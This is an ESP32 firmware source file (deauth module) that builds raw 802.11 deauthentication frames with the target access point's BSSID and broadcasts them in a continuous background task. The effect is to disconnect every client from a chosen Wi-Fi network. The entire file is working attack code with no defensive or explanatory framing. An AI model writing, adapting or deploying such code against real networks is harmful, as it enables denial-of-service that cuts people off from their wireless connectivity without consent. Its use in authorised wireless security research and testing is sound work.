#include "deauth.h"
#include "esp_wifi.h"
#include "WiFi.h"
#include "common.h"

bool deauthActive = false;
volatile unsigned long deauthPacketCount = 0;

uint8_t apMAC[6];       // BSSID of target AP
uint8_t sourceMAC[6];   // Our MAC (ESP32)
int targetChannel = 1;
String targetSSID="";

void sendDeauthPacket(uint8_t* target) {
    uint8_t packet[26] = {
        0xC0, 0x00,                               // Frame Control: deauth
        0x00, 0x00,                               // Duration
        target[0], target[1], target[2], target[3], target[4], target[5],               // Receiver MAC
        sourceMAC[0], sourceMAC[1], sourceMAC[2], sourceMAC[3], sourceMAC[4], sourceMAC[5], // Sender MAC (our ESP)
        apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5],                     // BSSID (target AP)
        0x00, 0x00,                               // Sequence
        0x07, 0x00                                // Reason: Class 3 frame from non-associated STA
    };

    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    if (result == ESP_OK) {
        deauthPacketCount++;
    } else {
        Serial.print("[!] Packet send failed: ");
        Serial.println(result);
    }
}

void startDeauthLoop() {
    Serial.println("[DEAUTH] Sending deauth packets...");

    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    while (deauthActive) {
        sendDeauthPacket(broadcast);
        delay(100);
    }

    Serial.println("[DEAUTH] Loop exited.");
}

void deauthTask(void* parameter) {
    Serial.println("[TASK] Deauth task started.");
    startDeauthLoop();
    Serial.println("[TASK] Deauth task ended.");
    vTaskDelete(NULL);
}

void startDeauth(uint8_t* bssid, int channel) {
    Serial.println("[DEAUTH] Initializing...");

    memcpy(apMAC, bssid, 6);
    targetChannel = channel;
    deauthActive = true;

    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

    esp_err_t res = esp_wifi_get_mac(WIFI_IF_STA, sourceMAC);
    if (res != ESP_OK) {
        Serial.println("[!] Failed to get MAC address.");
        return;
    }

    Serial.print("[+] ESP32 MAC: ");
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", sourceMAC[i]);
        if (i < 5) Serial.print(":");
    }
    Serial.println();

    xTaskCreate(
        deauthTask,
        "Deauth Task",
        4096,
        NULL,
        1,
        NULL
    );
}

void stopDeauth() {
    deauthActive = false;
    Serial.println("[DEAUTH] Stopped.");
}
